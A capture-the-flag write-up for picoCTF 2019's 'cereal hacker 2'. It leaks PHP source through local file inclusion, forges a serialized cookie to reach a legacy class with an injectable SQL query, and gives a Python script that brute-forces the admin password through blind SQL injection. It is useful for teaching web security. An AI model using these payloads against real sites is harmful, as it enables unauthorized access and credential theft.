# cereal hacker 2

This time we start by leaking the source code.

For example `https://2019shell1.picoctf.com/problem/62195/index.php?file=php://filter/read=convert.base64-encode/resource=admin` Returns

```
PD9waHAKCnJlcXVpcmVfb25jZSgnY29va2llLnBocCcpOwoKaWYoaXNzZXQoJHBlcm0pICYmICRwZXJtLT5pc19hZG1pbigpKXsKPz4KCQoJPGJvZHk+CgkJPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJPGRpdiBjbGFzcz0icm93Ij4KCQkJCTxkaXYgY2xhc3M9ImNvbC1zbS05IGNvbC1tZC03IGNvbC1sZy01IG14LWF1dG8iPgoJCQkJCTxkaXYgY2xhc3M9ImNhcmQgY2FyZC1zaWduaW4gbXktNSI+CgkJCQkJCTxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CgkJCQkJCQk8aDUgY2xhc3M9ImNhcmQtdGl0bGUgdGV4dC1jZW50ZXIiPldlbGNvbWUgdG8gdGhlIGFkbWluIHBhZ2UhPC9oNT4KCQkJCQkJCTxoNSBzdHlsZT0iY29sb3I6Ymx1ZSIgY2xhc3M9InRleHQtY2VudGVyIj5GbGFnOiBGaW5kIHRoZSBhZG1pbidzIHBhc3N3b3JkITwvaDU+CgkJCQkJCTwvZGl2PgoJCQkJCTwvZGl2PgoJCQkJPC9kaXY+CgkJCTwvZGl2PgoJCTwvZGl2PgoKCTwvYm9keT4KCjw/cGhwCn0KZWxzZXsKPz4KCQoJPGJvZHk+CgkJPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KCQkJPGRpdiBjbGFzcz0icm93Ij4KCQkJCTxkaXYgY2xhc3M9ImNvbC1zbS05IGNvbC1tZC03IGNvbC1sZy01IG14LWF1dG8iPgoJCQkJCTxkaXYgY2xhc3M9ImNhcmQgY2FyZC1zaWduaW4gbXktNSI+CgkJCQkJCTxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CgkJCQkJCQk8aDUgY2xhc3M9ImNhcmQtdGl0bGUgdGV4dC1jZW50ZXIiPllvdSBhcmUgbm90IGFkbWluITwvaDU+CgkJCQkJCQk8Zm9ybSBhY3Rpb249ImluZGV4LnBocCIgbWV0aG9kPSJnZXQiPgoJCQkJCQkJCTxidXR0b24gY2xhc3M9ImJ0biBidG4tbGcgYnRuLXByaW1hcnkgYnRuLWJsb2NrIHRleHQtdXBwZXJjYXNlIiBuYW1lPSJmaWxlIiB2YWx1ZT0ibG9naW4iIHR5cGU9InN1Ym1pdCIgb25jbGljaz0iZG9jdW1lbnQuY29va2llPSd1c2VyX2luZm89OyBleHBpcmVzPVRodSwgMDEgSmFuIDE5NzAgMDA6MDA6MTggR01UOyBkb21haW49OyBwYXRoPS87JyI+R28gYmFjayB0byBsb2dpbjwvYnV0dG9uPgoJCQkJCQkJPC9mb3JtPgoJCQkJCQk8L2Rpdj4KCQkJCQk8L2Rpdj4KCQkJCTwvZGl2PgoJCQk8L2Rpdj4KCQk8L2Rpdj4KCgk8L2JvZHk+Cgo8P3BocAp9Cj8+Cg==
```

This is [Local file inclusion](https://wiki.owasp.org/index.php/Testing_for_Local_File_Inclusion)

```php
<?php

require_once('cookie.php');

if(isset($perm) && $perm->is_admin()){
?>
	
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">Welcome to the admin page!</h5>
							<h5 style="color:blue" class="text-center">Flag: Find the admin's password!</h5>
						</div>
					</div>
				</div>
			</div>
		</div>

	</body>

<?php
}
else{
?>
	
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">You are not admin!</h5>
							<form action="index.php" method="get">
								<button class="btn btn-lg btn-primary btn-block text-uppercase" name="file" value="login" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>

	</body>

<?php
}
?>
```

This would sugest looking at `cookie.php`. We can do that the same way to get
```php
<?php

require_once('../sql_connect.php');

// I got tired of my php sessions expiring, so I just put all my useful information in a serialized cookie
class permissions
{
	public $username;
	public $password;
	
	function __construct($u, $p){
		$this->username = $u;
		$this->password = $p;
	}

	function is_admin(){
		global $sql_conn;
		if($sql_conn->connect_errno){
			die('Could not connect');
		}
		//$q = 'SELECT admin FROM pico_ch2.users WHERE username = \''.$this->username.'\' AND (password = \''.$this->password.'\');';
		
		if (!($prepared = $sql_conn->prepare("SELECT admin FROM pico_ch2.users WHERE username = ? AND password = ?;"))) {
		    die("SQL error");
		}

		$prepared->bind_param('ss', $this->username, $this->password);
	
		if (!$prepared->execute()) {
		    die("SQL error");
		}
		
		if (!($result = $prepared->get_result())) {
		    die("SQL error");
		}

		$r = $result->fetch_all();
		if($result->num_rows !== 1){
			$is_admin_val = 0;
		}
		else{
			$is_admin_val = (int)$r[0][0];
		}
		
		$sql_conn->close();
		return $is_admin_val;
	}
}

/* legacy login */
class siteuser
{
	public $username;
	public $password;
	
	function __construct($u, $p){
		$this->username = $u;
		$this->password = $p;
	}

	function is_admin(){
		global $sql_conn;
		if($sql_conn->connect_errno){
			die('Could not connect');
		}
		$q = 'SELECT admin FROM pico_ch2.users WHERE admin = 1 AND username = \''.$this->username.'\' AND (password = \''.$this->password.'\');';
		
		$result = $sql_conn->query($q);
		if($result->num_rows != 1){
			$is_user_val = 0;
		}
		else{
			$is_user_val = 1;
		}
		
		$sql_conn->close();
		return $is_user_val;
	}
}


if(isset($_COOKIE['user_info'])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE['user_info'])));
	}
	catch(Exception $except){
		die('Deserialization error.');
	}
}

?>
```

The `permissions` class uses a prepared statement that makes a SQL injection way harder. Luckily we still have the `siteuser` class with a vulnerable SQL statement.

To access the `siteuser` class instead of sending something like `O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:9:"'or'1'='1";}` we need `O:8:"siteuser":2:{s:8:"username";s:5:"admin";s:8:"password";s:9:"'or'1'='1";}`.

This works because the [unserialize](https://www.php.net/manual/en/function.unserialize.php) function can create an instance of any class it wants.

Encoding this to get a cookie of 
`Tzo4OiJzaXRldXNlciI6Mjp7czo4OiJ1c2VybmFtZSI7czo1OiJhZG1pbiI7czo4OiJwYXNzd29yZCI7czo5OiInb3InMSc9JzEiO30=`
we can access the admin page. 

This confirms we can hit the bad SQL. However we also need to chain this with another way of leaking the admin password, which is the flag.

To do this we can use a query to see if the password is `LIKE` a certain string. This lets us guess char by char, instead of all at once. We also need the `BINARY` to make the query case sensitive.

```python
import requests
import string
import base64


def try_pwd(password):
    print("Testing: {}".format(password))
    injection = "' OR password LIKE BINARY '{}%".format(password)
    payload = 'O:8:"siteuser":2:{{s:8:"username";s:5:"admin";s:8:"password";s:{}:"{}";}}'.format(
        len(injection), injection).encode('utf-8')
    cookies = dict(user_info=base64.b64encode(payload).decode('utf-8'))
    r = requests.get(
        "http://2019shell1.picoctf.com:62195/index.php?file=admin", cookies=cookies)
    return "Welcome" in r.text


alpha = string.digits + string.ascii_letters + '{}'

flag = ""
while True:
    for c in alpha:
        if try_pwd(flag + c):
            flag += c
            print("Match: {}".format(flag))
            break
    else:
        break

print("Flag: {}".format(flag))
```

This takes about 3 mins, most of which is spend waiting for the server

```text
real	2m49.461s
user	0m3.797s
sys	0m0.692s
```

Flag: `picoCTF{c9f6ad462c6bb64a53c6e7a6452a6eb7}`

---
Adapted from [Dvd848](https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/cereal_hacker_2.md)

---
Looking at `index.php` we can see the inclusion vulnerability. The [include docs](https://www.php.net/manual/en/function.include.php) have a security warning for this sort of attack.
```php
<?php

if(isset($_GET['file'])){
	$file = $_GET['file'];
}
else{
	header('location: index.php?file=login');
	die();
}

if(realpath($file)){
	die();
}
else{
	include('head.php');
	if(!include($file.'.php')){
		echo 'Unable to locate '.$file.'.php';
	}
	include('foot.php');
}

?>
```